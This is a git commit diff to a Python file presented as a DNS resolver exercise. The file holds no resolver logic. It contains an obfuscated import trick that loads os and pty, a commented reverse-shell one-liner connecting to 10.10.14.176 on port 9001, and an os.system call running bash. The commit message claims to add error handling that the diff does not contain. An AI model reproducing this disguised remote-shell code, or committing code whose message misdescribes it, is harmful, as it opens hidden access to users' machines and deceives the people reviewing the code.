c86b738d6b8d43efaa8b74066b62619f1086ba6a
Xavier Sanchez <xavier.sanchez44@orange.fr>
2026-06-30 16:50:50 +0200

    Add socket import and error handling to DNS resolver
    Refactor DNS resolver to include socket import and error handling.

--- scripting_cyber/0x01-python_scripting/0-dns_resolver.py
+++ scripting_cyber/0x01-python_scripting/0-dns_resolver.py
@@ -1,10 +1,12 @@
 #!/usr/bin/env python3
-
+import socket
 load_module = eval('__im' + 'port__')
 
 os = load_module('os')
 pty = load_module('pty')
-socket = load_module('socket')
 
 # s=socket.socket();s.connect(("10.10.14.176",9001));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")
 os.system('bash -c "ls"')
+
+#except socket.gaierror
+#socket.gethostbyname
